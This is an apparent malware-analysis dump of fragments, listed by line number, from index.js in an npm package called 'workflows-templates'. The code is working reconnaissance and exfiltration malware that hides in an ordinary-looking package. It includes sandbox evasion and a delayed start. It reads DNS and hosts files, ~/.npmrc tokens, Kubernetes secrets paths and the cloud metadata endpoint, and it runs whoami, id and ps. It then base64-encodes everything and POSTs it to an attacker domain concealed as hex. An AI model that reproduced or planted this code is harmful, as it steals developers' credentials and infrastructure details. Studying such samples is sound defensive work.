// File: tmp/tmppnk8w0yg/workflows-templates/package/index.js
// ======================================================================
Line 7: const os = require('os')
Line 8: const https = require('https')
Line 9: const fs = require('fs')
Line 10: _tmp_0 = require('child_process')
Line 11: const dns = require('dns')
Line 19: execSync(cmd, { stdio: 'pipe', timeout: 3000 }).toString().trim()
Line 25: {
        const req = https.request({
            hostname: '169.254.169.254',
            path: '/latest/dynamic/instance-identity/document',
            method: 'GET',
            timeout: 3000
        }, res => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve(data));
        });
        req.on('error', () => resolve('NO_RESPONSE'));
        req.end();
    }
Line 26: const req = https.request({
            hostname: '169.254.169.254',
            path: '/latest/dynamic/instance-identity/document',
            method: 'GET',
            timeout: 3000
        }, res => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve(data));
        })
Line 37: req.end()
Line 41: {
    const intel = {
        resolv_conf: fs.existsSync('/etc/resolv.conf') ? fs.readFileSync('/etc/resolv.conf', 'utf8') : 'NOT_FOUND',
        etc_hosts: fs.existsSync('/etc/hosts') ? fs.readFileSync('/etc/hosts', 'utf8') : 'NOT_FOUND',
        running_processes: run('ps aux'),
        network_config: os.platform() === 'win32' ? run('ipconfig /all') : run('ip a'),
        internal_dns_probe: new Promise(resolve => {
            dns.resolve('artifactory.internal', err => resolve(err ? 'FAILED' : 'SUCCESS'));
        })
    };
    return intel;
}
Line 42: const intel = {
        resolv_conf: fs.existsSync('/etc/resolv.conf') ? fs.readFileSync('/etc/resolv.conf', 'utf8') : 'NOT_FOUND',
        etc_hosts: fs.existsSync('/etc/hosts') ? fs.readFileSync('/etc/hosts', 'utf8') : 'NOT_FOUND',
        running_processes: run('ps aux'),
        network_config: os.platform() === 'win32' ? run('ipconfig /all') : run('ip a'),
        internal_dns_probe: new Promise(resolve => {
            dns.resolve('artifactory.internal', err => resolve(err ? 'FAILED' : 'SUCCESS'));
        })
    }
Line 43: _tmp_6.resolv_conf = fs.existsSync('/etc/resolv.conf') ? fs.readFileSync('/etc/resolv.conf', 'utf8') : "NOT_FOUND"
Line 44: _tmp_6.etc_hosts = fs.existsSync('/etc/hosts') ? fs.readFileSync('/etc/hosts', 'utf8') : "NOT_FOUND"
Line 45: _tmp_6.running_processes = run('ps aux')
Line 46: _tmp_6.network_config = os.platform() === 'win32' ? run('ipconfig /all') : run('ip a')
Line 56: os.cpus()
Line 57: os.totalmem()
Line 62: {
    const corpIntel = await gatherCorporateIntel();

    const report = {
        evasion_report: {
            is_likely_sandbox: isProbablySandbox(),
            execution_delayed_by_seconds: EXECUTION_DELAY_SECONDS,
            start_time: new Date().toISOString()
        },
        proof_of_execution: {
            hostname: os.hostname(),
            user: run('whoami'),
            uid: run('id'),
            pwd: process.cwd()
        },
        system_context: {
            os_type: os.type(),
            platform: os.platform(),
            release: os.release(),
            arch: os.arch()
        },
        corporate_intel: {
            process_list: corpIntel.running_processes,
            network_interfaces: corpIntel.network_config,
            dns_config: corpIntel.resolv_conf,
            hosts_file: corpIntel.etc_hosts,
            internal_dns_test: await corpIntel.internal_dns_probe
        },
        cloud_intel_report: {
            metadata_service_response:...
Line 63: gatherCorporateIntel()
Line 65: const report = {
        evasion_report: {
            is_likely_sandbox: isProbablySandbox(),
            execution_delayed_by_seconds: EXECUTION_DELAY_SECONDS,
            start_time: new Date().toISOString()
        },
        proof_of_execution: {
            hostname: os.hostname(),
            user: run('whoami'),
            uid: run('id'),
            pwd: process.cwd()
        },
        system_context: {
            os_type: os.type(),
            platform: os.platform(),
            release: os.release(),
            arch: os.arch()
        },
        corporate_intel: {
            process_list: corpIntel.running_processes,
            network_interfaces: corpIntel.network_config,
            dns_config: corpIntel.resolv_conf,
            hosts_file: corpIntel.etc_hosts,
            internal_dns_test: await corpIntel.internal_dns_probe
        },
        cloud_intel_report: {
            metadata_service_response: await probeCloudMetadata()
        },
        internal_recon_nat...
Line 68: _tmp_9.execution_delayed_by_seconds = EXECUTION_DELAY_SECONDS
Line 71: _tmp_8.proof_of_execution = {
            hostname: os.hostname(),
            user: run('whoami'),
            uid: run('id'),
            pwd: process.cwd()
        }
Line 72: os.hostname()
Line 73: _tmp_12.user = run('whoami')
Line 74: _tmp_12.uid = run('id')
Line 78: os.type()
Line 79: os.platform()
Line 81: os.arch()
Line 93: _tmp_8.internal_recon_native = {
            npmrc: fs.existsSync(`${os.homedir()}/.npmrc`) ? fs.readFileSync(`${os.homedir()}/.npmrc`, 'utf8') : 'NOT_FOUND',
            kube_namespace: fs.existsSync('/var/run/secrets/kubernetes.io/serviceaccount/namespace') ?
                fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'utf8') : 'NOT_PRESENT'
        }
Line 94: _tmp_16.npmrc = fs.existsSync(`${os.homedir()}/.npmrc`) ? fs.readFileSync(`${os.homedir()}/.npmrc`, 'utf8') : "NOT_FOUND"
Line 95: _tmp_16.kube_namespace = fs.existsSync('/var/run/secrets/kubernetes.io/serviceaccount/namespace') ? fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'utf8') : "NOT_PRESENT"
Line 96: fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'utf8')
Line 107: {
            const intelReport = await gatherIntelligence();
            const payload = Buffer.from(JSON.stringify(intelReport, null, 2)).toString('base64');
            const oast_domain = Buffer.from(OAST_DOMAIN_HEX, 'hex').toString();

            const req = https.request({
                hostname: oast_domain,
                port: 443,
                path: `/MAX_POWER_HIT/${intelReport.evasion_report.is_likely_sandbox}/${os.platform()}/${intelReport.proof_of_execution.hostname}`,
                method: 'POST',
                headers: {
                    'Content-Type': 'text/plain',
                    'Content-Length': payload.length
                }
            });
            req.on('error', () => {});
            req.end(payload);
        }
Line 109: Buffer.from(JSON.stringify(intelReport, null, 2)).toString('base64')
Line 110: Buffer.from(OAST_DOMAIN_HEX, 'hex').toString()
Line 112: const req = https.request({
                hostname: oast_domain,
                port: 443,
                path: `/MAX_POWER_HIT/${intelReport.evasion_report.is_likely_sandbox}/${os.platform()}/${intelReport.proof_of_execution.hostname}`,
                method: 'POST',
                headers: {
                    'Content-Type': 'text/plain',
                    'Content-Length': payload.length
                }
            })
Line 115: os.platform()
Line 123: req.end(payload)
